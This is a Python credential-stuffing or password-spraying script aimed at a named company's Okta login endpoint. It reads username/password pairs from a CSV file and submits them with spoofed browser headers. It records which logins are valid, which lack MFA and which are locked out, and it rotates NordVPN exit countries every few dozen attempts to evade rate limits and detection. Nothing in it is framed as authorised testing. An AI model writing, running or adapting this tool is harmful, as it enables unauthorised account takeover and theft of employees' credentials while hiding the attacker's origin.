from nordvpn_connect import initialize_vpn, rotate_VPN, close_vpn_connection
import requests
import csv
import time


# optional, use this on Linux and if you are not logged in when using nordvpn command
guess_per_ip = 2
guess_per_username = 2
subdomain = 'tripactions'

"""
countries = ['United States', 'Canada', 'Argentina', 'Brazil', 'Mexico', 'Costa Rica', 'Chile', 
                     'United Kingdom', 'Germany', 'France', 'Netherlands', 'Sweden', 'Switzerland', 
                     'Denmark', 'Poland', 'Italy', 'Spain', 'Norway', 'Belgium', 'Ireland', 'Czech Republic', 
                     'Austria', 'Portugal', 'Finland', 'Ukraine', 'Romania', 'Serbia', 'Hungary', 'Luxembourg', 
                     'Slovakia', 'Bulgaria', 'Latvia', 'Greece', 'Iceland', 'Estonia', 'Albania', 'Croatia', 
                     'Cyprus', 'Slovenia', 'Moldova', 'Bosnia and Herzegovina', 'Georgia', 'North Macedonia', 
                     'Turkey', 'South Africa', 'India', 'Israel', 'Turkey', 'United Arab Emirates', 'Australia', 
                     'Taiwan', 'Singapore', 'Japan', 'Hong Kong', 'New Zealand', 'Malaysia', 'Vietnam', 'Indonesia', 
                     'South Korea', 'Thailand']
"""

countries = ['Croatia', 'Cyprus', 'Slovenia', 'Moldova', 'Bosnia and Herzegovina', 'Georgia', 'North Macedonia', 'Turkey', 'South Africa', 'India', 'Israel', 'Turkey', 'United Arab Emirates', 'Australia', 'Taiwan', 'Singapore', 'Japan', 'Hong Kong', 'New Zealand', 'Malaysia', 'Vietnam', 'Indonesia', 'South Korea', 'Thailand']
print(countries)



#shamelessly stolen from https://github.com/Rhynorater/Okta-Password-Sprayer/blob/master/oSpray.py
def checkCreds(creds, subdomain):
    username, password = creds
    session = requests.Session()
    rawBody = "{\"username\":\"%s\",\"options\":{\"warnBeforePasswordExpired\":true,\"multiOptionalFactorEnroll\":true},\"password\":\"%s\"}" % (username, password)
    #print(rawBody)
    headers = {"Accept":"application/json","X-Requested-With":"XMLHttpRequest","X-Okta-User-Agent-Extended":"okta-signin-widget-2.12.0","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0","Accept-Encoding":"gzip, deflate","Accept-Language":"en","Content-Type":"application/json"}
    response = session.post("https://%s.okta.com/api/v1/authn"%subdomain, data=rawBody, headers=headers)

    if response.status_code == 200 and 'status' in response.json():
        jsonData = response.json()
        if "LOCKED_OUT" == jsonData['status']:
            print ("Account locked out! %s:%s"%(username, password))
            output.write("Account locked out! "+username+':'+password+'\n')
        elif "MFA_ENROLL" == jsonData['status']:
            print ("Valid Credentials without MFA! %s:%s"%(username, password))
            output.write("Valid Credentials without MFA! "+username+':'+password+'\n')
        else:
            print ("Valid Credentials! %s:%s"%(username, password))
            output.write("Valid Credentials! "+username+':'+password+'\n')
    else:
        output.write("noluck:"+username+':'+password+'\n')
        print("noluck:"+username+':'+password+'\n')
    output.flush()
   

def checkuser(username, subdomain):
    
    session = requests.Session()
    rawBody = "{\"username\":\"%s\",\"options\":{\"warnBeforePasswordExpired\":true,\"multiOptionalFactorEnroll\":true}}" % (username)
    #print(rawBody)
    headers = {"Accept":"application/json","X-Requested-With":"XMLHttpRequest","X-Okta-User-Agent-Extended":"okta-signin-widget-2.12.0","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0","Accept-Encoding":"gzip, deflate","Accept-Language":"en","Content-Type":"application/json"}
    response = session.post("https://%s.okta.com/api/v1/authn"%subdomain, data=rawBody, headers=headers)
    
    if response.status_code == 200 and 'status' in response.json():
        jsonData = response.json()
        if "LOCKED_OUT" == jsonData['status']:
            print ("Account locked out!")
        elif "UNAUTHENTICATED" == jsonData['status']:
            print ("user and IP good to go")
        else:
            print(str(jsonData['status']))
            print(str(response.content))
    else:
        print(str(response.status_code))
        print(str(response.content))


file = open("16.csv",'r')
reader = csv.reader(file)
content = list(reader)
mydict = dict()

for line in content:
    creds = line
    uname = creds[0]
    passw = creds[1]
    if uname in mydict:
        mydict[uname].append(passw)
    else:
        mydict[uname] = [passw]
print(mydict)
file.close()


"""
with open("creds.csv", 'r') as fp:
    for count, line in enumerate(fp):
        pass
lines = count + 1

print(lines)
"""
output = open("output.txt",'w')

startrange = 0
endrange = 7

nextrange = 0

countrycounter = 0
attemptcounter = 0
settings = initialize_vpn(countries[countrycounter])  # starts nordvpn and stuff
rotate_VPN(settings)

tries = 0
tries2 = 0

for  user, passlist in mydict.items():
    for i in range(8): #cahnge endrange number later current 8
    
        creds = [user, passlist[i]]
        attemptcounter += 1
        while True:
            try:
                checkCreds(creds,subdomain)
                #r=requests.get("http://icanhazip.com")
                #print(r.content)
                break
            except:
                time.sleep(3)
                tries2 += 1
                if tries2 >3:
                    attemptcounter = 41
                    tries2 = 0
                
        if attemptcounter >= 40:
            while True:
                try:
                    #close_vpn_connection(settings)
                    #countrycounter += 1
                    settings = initialize_vpn(countries[countrycounter])  # starts nordvpn and stuff
                    rotate_VPN(settings)
                    attemptcounter = 0
                    countrycounter += 1
                    print(countrycounter)
                    break
                except:
                    tries += 1
                    if tries > 10:
                        print("Check smth")
                        quit()
        
        
    
close_vpn_connection(settings)






"""
for country in countries:
    
    settings = initialize_vpn(country)  # starts nordvpn and stuff
    rotate_VPN(settings)
    attempt_counter = 1
    
    for  user, passlist in mydict.items():

        for i in range(40):
            if line_counter >= lines:
                break
            creds = content[line_counter]
            nextrange += 1
            #checkuser(username,subdomain)
            username = creds[0]
            print(creds)
            username, password = creds
            print(password)
            print(username)
            output.write(str(creds)+':tested\n')

    if line_counter >= lines:
        break
    close_vpn_connection(settings)


"""
output.close()
